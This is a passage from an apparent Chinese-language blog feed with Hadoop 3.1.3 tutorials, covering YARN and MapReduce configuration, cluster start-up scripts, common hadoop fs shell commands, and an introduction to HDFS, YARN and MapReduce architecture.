punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.resource.memory-mb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>4096<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 关闭yarn对物理内存和虚拟内存的限制检查 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.pmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.vmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）MapReduce配置文件:配置mapred-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim mapred-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 指定MapReduce程序运行在Yarn上 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.framework.name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>yarn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）在集群上分发配置好的Hadoop配置文件，将配置文件同步到hadoop103和hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）去103和104上查看文件分发情况</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop103 ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml<span class="token punctuation">[</span>root@hadoop104 ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-2-4-启动集群"><a href="#4-2-4-启动集群" class="headerlink" title="4.2.4  启动集群"></a>4.2.4  启动集群</h4><p><strong>1）配置workers</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim /opt/module/hadoop-3.1.3/etc/hadoop/workers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在该文件中增加如下内容：</p><pre><code>hadoop102hadoop103hadoop104</code></pre><p>注意：该文件中添加的内容结尾不允许有空格，文件中不允许有空行。</p><p>同步所有节点配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ xsync /opt/module/hadoop-3.1.3/etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2）启动集群</strong></p><p>​    （1）如果集群是第一次启动，需要在hadoop102节点格式化NameNode（注意格式化NameNode，会产生新的集群id，导致NameNode和DataNode的集群id不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化NameNode的话，一定要先停止namenode和datanode进程，并且要删除所有机器的data和logs目录，然后再进行格式化。）</p><pre><code>[root@hadoop102 ~]$ hdfs namenode -format</code></pre><p>（2）启动HDFS</p><pre><code>[root@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</code></pre><p>（3）在配置了ResourceManager的节点（hadoop103）启动YARN</p><pre><code>[root@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh</code></pre><p>（4）Web端查看HDFS的NameNode</p><p>​    （a）浏览器中输入：<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p><p>​    （b）查看HDFS上存储的数据信息</p><p>（5）Web端查看YARN的ResourceManager</p><p>​    （a）浏览器中输入：<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p><p>​    （b）查看YARN上运行的Job信息</p><h4 id="4-2-5-集群基本测试"><a href="#4-2-5-集群基本测试" class="headerlink" title="4.2.5 集群基本测试"></a>4.2.5 集群基本测试</h4><p>HDFS相当于一个文件存储框架，搭好集群后，可以在集群去对文件进行操作，上传，下载，删除，查看等。</p><p><strong>（1）上传文件到集群</strong></p><p>​    上传小文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ hadoop fs -mkdir /input<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ hadoop fs -put <span class="token variable">$HADOOP_HOME</span>/wcinput/word.txt /input<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    上传大文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ hadoop fs -put  /opt/software/jdk-8u212-linux-x64.tar.gz  /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>（2）上传文件后查看文件存放在什么位置</strong></p><p>（a）查看HDFS文件存储路径</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 subdir0<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3/data/dfs/data/current/BP-938951106-192.168.10.107-1495462844069/current/finalized/subdir0/subdir0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（b）查看HDFS在磁盘存储文件内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 subdir0<span class="token punctuation">]</span>$ <span class="token function">cat</span> blk_1073741825hadoop yarnhadoop mapreduce rootroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（3）下载</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop104 software<span class="token punctuation">]</span>$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>（4）执行wordcount程序</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-6-集群启动-停止方式总结"><a href="#4-2-6-集群启动-停止方式总结" class="headerlink" title="4.2.6 集群启动/停止方式总结"></a>4.2.6 集群启动/停止方式总结</h4><p><strong>1）各个服务组件逐一启动/停止</strong></p><p>​    （1）分别启动/停止HDFS组件</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs --daemon start/stop namenode/datanode/secondarynamenode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （2）启动/停止YARN</p><pre class="line-numbers language-bash"><code class="language-bash">yarn --daemon start/stop resourcemanager/nodemanager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）各个模块分开启动/停止（配置ssh是前提）常用</p><p>​    （1）整体启动/停止HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">start-dfs.sh/stop-dfs.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （2）整体启动/停止YARN</p><pre class="line-numbers language-bash"><code class="language-bash">start-yarn.sh/stop-yarn.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-7-编写hadoop集群常用脚本"><a href="#4-2-7-编写hadoop集群常用脚本" class="headerlink" title="4.2.7 编写hadoop集群常用脚本"></a>4.2.7 编写hadoop集群常用脚本</h4><p><strong>(1）查看三台服务器java进程脚本：jpsall</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> /home/root/bin<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ vim jpsall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> host <span class="token keyword">in</span> hadoop102 hadoop103 hadoop104<span class="token keyword">do</span>​    <span class="token keyword">echo</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token variable">$host</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>​    <span class="token function">ssh</span> <span class="token variable">$host</span> jps <span class="token variable">$@</span> <span class="token operator">|</span> <span class="token function">grep</span> -v Jps<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后退出，然后赋予脚本执行权限</p><p>[root@hadoop102 bin]$ chmod +x jpsall</p><p><strong>（2）hadoop集群启停脚本（包含hdfs，yarn，historyserver）：</strong>myhadoop.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> /home/root/bin<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ vim myhadoop.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> $<span class="token comment" spellcheck="true"># -lt 1 ]</span><span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"No Args Input..."</span>  <span class="token keyword">exit</span> <span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token keyword">case</span> <span class="token variable">$1</span> <span class="token keyword">in</span><span class="token string">"start"</span><span class="token punctuation">)</span>​    <span class="token keyword">echo</span> <span class="token string">" =================== 启动 hadoop集群 ==================​    echo "</span> --------------- 启动 hdfs ---------------<span class="token string">"​    ssh hadoop102 "</span>/opt/module/hadoop-3.1.3/sbin/start-dfs.sh<span class="token string">"​    echo "</span> --------------- 启动 yarn ---------------<span class="token string">"​    ssh hadoop103 "</span>/opt/module/hadoop-3.1.3/sbin/start-yarn.sh<span class="token string">"​    echo "</span> --------------- 启动 historyserver ---------------<span class="token string">"​    ssh hadoop102 "</span>/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver<span class="token string">";;"</span>stop<span class="token string">")​    echo "</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 关闭 hadoop集群 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>​    <span class="token keyword">echo</span> <span class="token string">" --------------- 关闭 historyserver ---------------"</span>​    <span class="token function">ssh</span> hadoop102 <span class="token string">"/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver"</span>​    <span class="token keyword">echo</span> <span class="token string">" --------------- 关闭 yarn ---------------"</span>​    <span class="token function">ssh</span> hadoop103 <span class="token string">"/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh"</span>​    <span class="token keyword">echo</span> <span class="token string">" --------------- 关闭 hdfs ---------------"</span>​    <span class="token function">ssh</span> hadoop102 <span class="token string">"/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh"</span><span class="token punctuation">;</span><span class="token punctuation">;</span>*<span class="token punctuation">)</span>  <span class="token keyword">echo</span> <span class="token string">"Input Args Error..."</span><span class="token punctuation">;</span><span class="token punctuation">;</span>esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后退出，然后赋予脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> +x myhadoop.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）分发/home/root/bin目录，保证自定义脚本在三台机器上都可以使用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ xsync /home/root/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-hdfs常用shell操作"><a href="#5-hdfs常用shell操作" class="headerlink" title="5 hdfs常用shell操作"></a>5 hdfs常用shell操作</h2><h3 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h3><p>hadoop fs 具体命令  OR hdfs dfs 具体命令</p><p>两个是完全相同的。</p><h3 id="2-2-命令大全"><a href="#2-2-命令大全" class="headerlink" title="2.2 命令大全"></a>2.2 命令大全</h3><p>查看所有命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ bin/hadoop fs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-3-常用命令实操"><a href="#2-3-常用命令实操" class="headerlink" title="2.3 常用命令实操"></a>2.3 常用命令实操</h3><h4 id="2-3-1-准备工作"><a href="#2-3-1-准备工作" class="headerlink" title="2.3.1 准备工作"></a>2.3.1 准备工作</h4><p>1）启动Hadoop集群（方便后续的测试）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>root@hadoop103 hadoop-3.1.3<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）-help：输出这个命令参数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -help <span class="token function">rm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-3-2-上传"><a href="#2-3-2-上传" class="headerlink" title="2.3.2 上传"></a>2.3.2 上传</h4><p>1）-moveFromLocal：从本地剪切粘贴到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">touch</span> kongming.txt<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -moveFromLocal ./kongming.txt /sanguo/shuguo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）-copyFromLocal：从本地文件系统中拷贝文件到HDFS路径去</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -copyFromLocal README.txt /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）-appendToFile：追加一个文件到已经存在的文件末尾</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">touch</span> liubei.txt<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">vi</span> liubei.txtsan gu mao lu<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -appendToFile liubei.txt /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>4）-put：等同于copyFromLocal</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -put ./liubei.txt /user/root/test/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-3-3-下载"><a href="#2-3-3-下载" class="headerlink" title="2.3.3 下载"></a>2.3.3 下载</h4><p>1）-copyToLocal：从HDFS拷贝到本地</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -copyToLocal /sanguo/shuguo/kongming.txt ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）-get：等同于copyToLocal，就是从HDFS下载文件到本地</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -get /sanguo/shuguo/kongming.txt ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）-getmerge：合并下载多个文件，比如HDFS的目录 /user/root/test下有多个文件:log.1, log.2,log.3,…</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -getmerge /user/root/test/* ./zaiyiqi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-3-4-HDFS直接操作"><a href="#2-3-4-HDFS直接操作" class="headerlink" title="2.3.4 HDFS直接操作"></a>2.3.4 HDFS直接操作</h4><p>1）-ls: 显示目录信息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -ls /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）-mkdir：在HDFS上创建目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -mkdir -p /sanguo/shuguo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）-cat：显示文件内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -cat /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）-chgrp 、-chmod、-chown：Linux文件系统中的用法一样，修改文件所属权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -chmod 666 /sanguo/shuguo/kongming.txt<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -chown root:root  /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5）-cp ：从HDFS的一个路径拷贝到HDFS的另一个路径</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -cp /sanguo/shuguo/kongming.txt /zhuge.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）-mv：在HDFS目录中移动文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -mv /zhuge.txt /sanguo/shuguo/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）-tail：显示一个文件的末尾1kb的数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -tail /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）-rm：删除文件或文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -rm /user/root/test/jinlian2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9）-rmdir：删除空目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -mkdir /test<span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -rmdir /test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>10）-du统计文件夹的大小信息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -du -s -h /user/root/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11）-setrep：设置HDFS中文件的副本数量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop fs -setrep 10 /sanguo/shuguo/kongming.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里设置的副本数只是记录在NameNode的元数据中，是否真的会有这么多副本，还得看DataNode的数量。因为目前只有3台设备，最多也就3个副本，只有节点数的增加到10台时，副本数才能达到10。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-hdfs1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（一）hadoop介绍</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-hdfs/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-hdfs/</guid>
      <pubDate>Thu, 12 Nov 2020 07:34:38 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-hadoop是什么"><a href="#1-hadoop是什么" class="headerlink" title="1 hadoop是什么"></a>1 hadoop是什么</h2><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构。它提供了一个<strong>海量数据存储</strong>和<strong>分析计算</strong>的能力。广义上来说Hadoop这个词代表了Hadoop生态圈。 </p><p>Hadoop的核心是YARN,HDFS和Mapreduce。随着处理任务不同，各种组件相继出现，丰富Hadoop生态圈，目前生态圈结构大致如图所示 。</p><p><img src="/2020/11/12/bigdata-hdfs/1636705530947.png" alt="1636705530947"></p><h2 id="2-Hadoop的特点"><a href="#2-Hadoop的特点" class="headerlink" title="2. Hadoop的特点"></a>2. Hadoop的特点</h2><ul><li>扩容能力（Scalable） 能可靠地（reliably）存储和处理千兆字节（PB）数据</li><li>成本低（Economical） 可以通过普通机器组成的服务器集群来分发以及处理数据。这些服务器几圈总计可以达到千个节点。</li><li>高效率（Efficient） 通过分发数据，hadoop 可以在数据所在的节点上并行的(parallel)处理它们，这使得处理非常快。</li><li>可靠性（Reliable） hadoop 能自动地维护数据的多份副本，并且在任务失败后能自动重新部署(redeploy)计算任务</li></ul><h2 id="3-Hadoop三大发行版本"><a href="#3-Hadoop三大发行版本" class="headerlink" title="3 Hadoop三大发行版本"></a>3 Hadoop三大发行版本</h2><p>Hadoop三大发行版本：Apache、Cloudera、Hortonworks。</p><p>Apache版本最原始（最基础）的版本，对于入门学习最好。</p><p>Cloudera内部集成了很多大数据框架。对应产品CDH。</p><p>Hortonworks文档较好。对应产品HDP。后面被Cloudera收购</p><h2 id="4-Hadoop组成"><a href="#4-Hadoop组成" class="headerlink" title="4 Hadoop组成"></a>4 Hadoop组成</h2><p> Hadoop的核心组件分为：HDFS（分布式文件系统）、MapRuduce（分布式运算编程框架）、YARN（运算资源调度系统） 。</p><p><img src="/2020/11/12/bigdata-hdfs/1636706148747.png" alt="1636706148747"></p><h3 id="4-1-HDFS"><a href="#4-1-HDFS" class="headerlink" title="4.1 HDFS"></a>4.1 HDFS</h3><p>​    整个Hadoop的体系结构主要是通过HDFS（Hadoop分布式文件系统）来实现对分布式存储的底层支持，并通过MR来实现对分布式并行任务处理的程序支持。<strong>HDFS是Hadoop体系中数据存储管理的基础</strong>。</p><p> 一个HDFS集群是由一个NameNode和若干个DataNode组成的。NameNodee存储元数据，作为主服务器，管理文件系统命名空间和客户端对文件的访问操作。DataNode存储数据，DataNode管理存储的数据。HDFS支持文件形式的数据。 </p><p><img src="/2020/11/12/bigdata-hdfs/1636706441346.png" alt="1636706441346"></p><h3 id="4-2-YARN架构"><a href="#4-2-YARN架构" class="headerlink" title="4.2  YARN架构"></a>4.2  YARN架构</h3><p>上面我们说了 Hadoop2.x 中增加了 Yarn(资源调度)，那资源调度是在调度什么呢？在计算机中资源就是CPU和内存，CPU和内存都是有上限的，所以需要分配给更需要的进程来使用。</p><p><img src="/2020/11/12/bigdata-hdfs/1636706565758.png" alt="1636706565758"></p><p>ResourceManager（RM）就是资源管理者，外部的客户端提交作业请求都会先到 ResourceManager（RM），他代表了集群所有的资源，并监控 NodeManager、启动或监控ApplicationMaster。</p><p>NodeManager（NM） 只管理一个节点的资源，处理来自ResourceManager（RM）的命令和来自ApplicationMaster的命令。</p><p>ApplicationMaster（AM）负责数据的切分、为应用程序申请资源分配内部任务和任务的监控容错。当一个任务提交到 ResourceManager（RM）时就会选择一个节点启动一个ApplicationMaster（AM）来负责这个任务的跟进，也就是对这个任务的一个负责人。也就是说有一个作业任务就会有对应的一个ApplicationMaster（AM）来跟进这个作业任务的执行和调度。</p><p>Container 是对资源的一个抽象封装，里面会包含内存、CPU、磁盘、网络等资源，NodeManager（NM） 就是通过打开和关闭 Container 来调度资源的。</p><h3 id="4-3-MapReduce架构概述"><a href="#4-3-MapReduce架构概述" class="headerlink" title="4.3   MapReduce架构概述"></a>4.3   MapReduce架构概述</h3><p> MapReduce是一种编程模型，用于大规模数据集的并行计算，需要将数据分配到大量的机器上计算，每台机器运行一个子计算任务，最后再合并每台机器运算结果并输出。 MapReduce 的思想就是 『分而治之』.</p><p>MapReduce将计算过程分为两个阶段：Map和Reduce</p><p>1）Map阶段并行处理输入数据</p><p>2）Reduce阶段对Map结果进行汇总</p><p><img src="/2020/11/12/bigdata-hdfs/1636706761153.png" alt="1636706761153"></p><h2 id="5-大数据技术生态体系"><a 